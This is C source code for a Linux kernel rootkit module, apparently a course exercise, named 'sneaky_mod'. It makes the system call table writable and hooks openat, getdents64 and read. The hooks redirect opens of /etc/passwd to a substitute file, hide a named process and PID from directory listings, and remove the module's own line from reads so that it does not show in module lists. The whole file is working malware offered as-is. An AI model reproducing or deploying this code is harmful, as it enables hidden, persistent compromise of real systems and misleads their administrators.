
#include <linux/module.h>       //for all modules
#include <linux/init.h>         //for entry/exit macros
#include <linux/kernel.h>       //for printk and other kernel bits
#include <asm/current.h>        //process information
#include <linux/sched.h>
#include <linux/highmem.h>      //for changing page permissions
#include <asm/unistd.h>         //for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
							      
			    	      
#include <linux/moduleparam.h>	//for module_param()	      
#include <linux/dirent.h>

//This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}


static char * myPID = NULL;				     
module_param(myPID,charp,0);//pointer to a char	     

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  char  * path = (char *)regs->si;
  const char * dest = "/tmp/passwd";
  size_t dest_len = strlen(dest);
  if(strcmp(path,"/etc/passwd") == 0){//if the user is tring to 'openat' /etc/passwd, we instead display another file...
     copy_to_user((void*)path,dest,dest_len);
  }
  return (*original_openat)(regs);
}


asmlinkage int (*original_getdents64) (const struct pt_regs *);

asmlinkage int sneaky_sys_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

    int ret = original_getdents64(regs);
    if (ret <= 0)
        return ret;
     
    struct linux_dirent64 *entry, *prev_entry = NULL;
    size_t bytes_copied = 0;
   

    while (bytes_copied < ret) {
        entry = (struct linux_dirent64 *)((char *)dirent + bytes_copied);
       
        if (strcmp(entry->d_name, "sneaky_process") == 0 ||
            strcmp(entry->d_name, myPID) == 0) {
            /* Skip this directory entry by adding its d_reclen to the previous entry */
            if (prev_entry != NULL) {
                prev_entry->d_reclen += entry->d_reclen;
                bytes_copied += entry->d_reclen;
            }
            else{//it is indeed the first directory entry and it should be hidden!
                ret -= entry->d_reclen;
                memmove(entry, (void *)entry + entry->d_reclen, ret);
            }
        } else {
            prev_entry = entry;
            bytes_copied += entry->d_reclen;
        }
    }
    return ret;
}


asmlinkage ssize_t (*original_read)(struct pt_regs *);
asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
    ssize_t totalBytes;
    char *buffer, *start, *end, *src, *dst;

    // Call the original read function to read from the file
    totalBytes = original_read(regs);
    if (totalBytes <= 0) {
        return totalBytes;
    }

    // Get a pointer to the buffer passed to the read system call
    buffer = (char *)regs->si;

    // Search for the "sneaky_mod" string in the buffer
    start = strstr(buffer, "sneaky_mod ");
    if (start == NULL) {
        return totalBytes;
    }

    // Search for the next newline character after the "sneaky_mod" string
    end = strchr(start, '\n');
    if (end == NULL) {
        return totalBytes;
    }

    // Move the contents of the buffer after the newline character
    // to the position of the "sneaky_mod" string
    src = end + 1;
    dst = start;
    memmove(dst, src, totalBytes - (src - buffer));
    totalBytes -= end - start + 1;

    return totalBytes;
}




// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  original_read = (void *)sys_call_table[__NR_read];


  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  sys_call_table[__NR_getdents64] =(unsigned long)sneaky_sys_getdents64; 
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;   
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
   
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;	 
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_read] = (unsigned long)original_read;
  
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");
